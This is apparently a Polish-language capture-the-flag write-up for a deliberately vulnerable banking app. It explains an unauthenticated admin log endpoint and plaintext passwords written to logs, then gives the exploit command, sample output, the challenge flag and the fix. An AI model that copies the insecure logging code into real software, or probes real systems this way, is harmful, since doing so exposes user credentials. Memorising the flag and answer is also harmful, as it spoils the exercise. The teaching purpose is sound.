# A09 — Security Logging & Alerting Failures

## Metadane
- **ID:** A09
- **Kategoria:** OWASP A09:2025 - Security Logging and Alerting Failures
- **Trudność:** easy
- **Punkty:** 100
- **Flaga:** `PWR{logs_exposed_no_auth}`

## Opis
Dwa błędy jednocześnie:
1. **Brak autoryzacji** na endpoincie `/api/admin/logs` — każdy może czytać logi
2. **Hasła w logach** — przy błędnym logowaniu backend loguje `email:password` w plaintext

Zaseedowane logi zawierają wpis z próbą logowania jako admin — "hasłem" jest flaga CTF.

## Exploit

```bash
# Bez żadnego tokenu autoryzacji
curl http://localhost:5000/api/admin/logs
```

Wyjście zawiera:
```json
{
  "logs": [
    "2024-01-15 08:23:11 ERROR Login failed for admin@vulnbank.pl with password PWR{logs_exposed_no_auth}",
    "2024-01-15 08:23:15 ERROR Login failed for alice@vulnbank.pl with password qwerty123",
    ...
  ]
}
```

Flaga widoczna w pierwszym wpisie jako "hasło" administratora.

## Jak to naprawić

### 1. Dodaj autoryzację na endpoint
```python
@admin_bp.route("/logs", methods=["GET"])
@jwt_required()  # ← dodaj
def get_logs():
    err = require_admin()  # ← i wymagaj admina
    if err:
        return err
    ...
```

### 2. Nie loguj haseł
```python
# Źle:
logger.error(f"Login failed for {email} with password {password}")

# Dobrze:
logger.warning(f"Failed login attempt for {email}")
```

## Referencje
- OWASP A09:2025 - Security Logging and Alerting Failures
- [CWE-532: Insertion of Sensitive Information into Log File](https://cwe.mitre.org/data/definitions/532.html)
